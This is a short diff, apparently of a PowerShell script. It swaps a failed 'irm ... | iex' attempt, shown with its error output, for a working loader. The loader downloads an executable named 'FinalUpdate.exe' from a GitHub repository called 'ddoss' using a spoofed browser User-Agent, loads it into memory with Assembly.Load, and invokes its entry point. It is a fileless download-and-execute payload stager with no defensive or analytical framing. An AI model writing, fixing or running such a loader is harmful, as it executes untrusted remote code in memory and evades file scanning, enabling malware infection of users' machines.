@@ -1,9 +1,12 @@
-PS C:\Windows\system32> irm https://github.com/srap18/ddoss/raw/refs/heads/main/12111 | iex
-Exception calling "Invoke" with "2" argument(s): "Parameter count mismatch."
-At line:1 char:210
-+ ... $a=[System.Reflection.Assembly]::Load($d);$a.EntryPoint.Invoke($null,
-+                                               ~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
-    + FullyQualifiedErrorId : TargetParameterCountException
-
-PS C:\Windows\system32>
+$u = "https://github.com/srap18/ddoss/raw/refs/heads/main/FinalUpdate.exe"
+$w = New-Object Net.WebClient
+$w.Headers.Add("User-Agent", "Mozilla/5.0")
+$d = $w.DownloadData($u)
+$a = [System.Reflection.Assembly]::Load($d)
+$m = $a.EntryPoint
+$p = $m.GetParameters()
+if ($p.Count -eq 0) {
+    $m.Invoke($null, $null)
+} else {
+    $m.Invoke($null, @(,[string[]]@()))
+}
